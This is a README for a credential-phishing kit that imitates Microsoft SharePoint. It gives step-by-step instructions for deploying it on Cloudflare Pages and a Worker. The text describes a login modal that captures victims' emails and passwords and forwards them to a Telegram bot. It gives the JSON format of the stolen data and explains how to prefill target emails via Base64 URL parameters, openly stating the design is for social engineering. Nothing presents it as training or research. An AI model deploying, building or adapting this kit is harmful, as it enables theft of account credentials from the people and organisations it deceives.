# SharePoint Phishing App - Cloudflare Deployment

This app is designed to be deployed on Cloudflare Pages with a Cloudflare Worker for backend functionality.

## Project Structure

```
/
├── index-standalone.html    # Main HTML file
├── app.js                  # Frontend JavaScript
├── _redirects              # Cloudflare Pages routing
├── worker/                 # Cloudflare Worker
│   ├── src/index.js       # Worker code
│   ├── wrangler.toml      # Worker configuration
│   └── package.json       # Worker dependencies
└── README-CLOUDFLARE.md   # This file
```

## Deployment Steps

### 1. Deploy the Cloudflare Worker

1. Navigate to the `worker` directory:
   ```bash
   cd worker
   ```

2. Install Wrangler CLI:
   ```bash
   npm install -g wrangler
   ```

3. Login to Cloudflare:
   ```bash
   wrangler login
   ```

4. Deploy the worker:
   ```bash
   npm run deploy
   ```

5. Note the worker URL (e.g., `https://sharepoint-phishing-worker.your-subdomain.workers.dev`)

### 2. Update Worker URL in Frontend

1. Edit `app.js` and update the `WORKER_URL` constant with your actual worker URL:
   ```javascript
   const WORKER_URL = "https://sharepoint-phishing-worker.your-subdomain.workers.dev";
   ```

### 3. Deploy to Cloudflare Pages

1. Connect your repository to Cloudflare Pages
2. Set build settings:
   - **Build command**: (leave empty)
   - **Build output directory**: `/`
   - **Root directory**: `/`

3. Deploy the site

## Configuration

### Environment Variables (Worker)

The worker uses these environment variables defined in `wrangler.toml`:

- `TELEGRAM_BOT_TOKEN`: Your Telegram bot token
- `TELEGRAM_CHAT_ID`: Your Telegram chat ID

### Features

- **Loading Animation**: Simulates SharePoint loading
- **File List**: Displays fake SharePoint files
- **Email Converter**: Converts emails to Base64 for URL parameters
- **Auth Modal**: Captures credentials and sends to Telegram via Worker
- **Responsive Design**: Works on desktop and mobile

### Security Features

- CORS headers for cross-origin requests
- Input validation and sanitization
- Error handling and logging
- IP and country detection via Cloudflare headers

## Worker API

The worker accepts POST requests with the following JSON structure:

```json
{
  "email": "user@example.com",
  "password": "userpassword",
  "userAgent": "Mozilla/5.0...",
  "referrer": "https://example.com",
  "timestamp": "2024-01-01T00:00:00.000Z"
}
```

Response:
```json
{
  "success": true,
  "message": "Data processed successfully"
}
```

## Local Development

### Worker Development
```bash
cd worker
npm install
npm run dev
```

### Frontend Development
Serve the HTML file with any static server:
```bash
python -m http.server 8000
# or
npx serve .
```

## Telegram Bot Setup

1. Create a bot with @BotFather on Telegram
2. Get the bot token
3. Get your chat ID (message @userinfobot)
4. Update the environment variables in `wrangler.toml`

## Notes

- The app is completely static and doesn't require any server-side rendering
- All backend functionality is handled by the Cloudflare Worker
- The design mimics Microsoft SharePoint for social engineering purposes
- Email addresses can be pre-filled via URL parameters using Base64 encoding